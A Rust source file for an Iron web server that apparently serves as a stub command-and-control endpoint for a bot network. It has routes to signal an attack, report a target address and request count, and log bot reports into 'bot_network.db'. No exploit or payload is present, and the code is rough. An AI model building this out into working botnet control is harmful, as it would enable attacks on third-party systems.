extern crate bodyparser;
extern crate iron;
extern crate postgres;
extern crate router;
extern crate rusqlite;

use iron::prelude::*;
use iron::status;
use router::Router;
use rusqlite::{Connection, Result};
use serde_json;
use std::vec;

struct ServerData {
    attack_address: String,
    ret_data: Vec<String>,
}

impl ServerData {
    fn new(addr: String, ret: Vec<String>) -> ServerData {
        ServerData {
            attack_address: addr,
            ret_data: ret,
        }
    }
}

fn main() {
    let mut router = Router::new();
    let server = ServerData::new(String::from("14"), vec![]);
    router.get(
        "/api/attack",
        move |_: &mut Request| Ok(Response::with((status::Ok, "true"))),
        "attack",
    );
    router.get(
        "/attack_info",
        move |_: &mut Request| {
            let attack_info = serde_json::json!({
                "attack_address": &server.attack_address,
                "requests_completed_amount": server.ret_data.len(),
            });
            Ok(Response::with((status::Ok, attack_info.to_string())))
        },
        "attack_info",
    );

    router.post(
        "attack_info",
        move |req: &mut Request| {
            let body = req.get::<bodyparser::Json>().unwrap();
            let _received = match body {
                None => serde_json::json!({"error": "No body"}).to_string(),
                Some(body) => serde_json::json!(body).to_string(),
            };

            let conn = Connection::open("bot_network.db").unwrap();
            conn.execute(
                "CREATE TABLE IF NOT EXISTS request_info (
             id INTEGER PRIMARY KEY,
             status_code TEXT,
             received_data TEXT
         )",
                [],
            )
            .unwrap();

            conn.execute(
                "INSERT INTO request_info (status_code, received_data) VALUES (?1, ?2)",
                &[&status::Ok.to_string(), &_received],
            )
            .unwrap();

            Ok(Response::with((status::Ok, "ok")))
        },
        "set_attack_info",
    );
    Iron::new(router).http("localhost:8080").unwrap();
}
